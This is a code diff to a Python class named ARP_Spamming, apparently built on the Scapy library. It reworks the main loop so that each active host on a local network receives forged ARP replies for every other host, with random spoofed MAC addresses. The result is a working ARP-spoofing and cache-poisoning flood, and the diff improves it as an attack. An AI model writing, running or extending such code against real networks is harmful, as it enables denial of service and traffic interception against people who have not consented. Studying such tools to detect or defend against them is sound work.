@@ -15,7 +15,6 @@ class ARP_Spamming:
         # Creates the set of random Mac addresses
         self.rnd_mac_addresses = []
         self.gen_random_mac_set(len(self.active_hosts))
-        print(self.rnd_mac_addresses)
 
         self.running = True
         self.total_packets = 0
@@ -27,13 +26,10 @@ class ARP_Spamming:
             for host_dst in self.active_hosts:
                 count = 0
 
-                # TODO Need to generate a random IP here
-                host_src = "192.168.1.1"
-
-
-                self.send_arp_packet(host_dst, host_src, self.rnd_mac_addresses[count])
-
-                count += 1
+                for host_src in self.active_hosts:
+                    if host_dst != host_src:
+                        self.send_arp_packet(host_dst, host_src, self.rnd_mac_addresses[count])
+                        count += 1
 
     def stop(self):
         self.running = False
@@ -50,7 +46,7 @@ class ARP_Spamming:
     def send_arp_packet(self, dst, src, mac, op_code=2):
         self.print_stats(dst, src, mac)
 
-        pkt = IP()/ARP(op=1, pdst=dst, psrc=src, hwdst=mac)
+        pkt = ARP(op=2, pdst=dst, psrc=src, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac)
 
         send(pkt, verbose=0)
         self.total_packets += 1
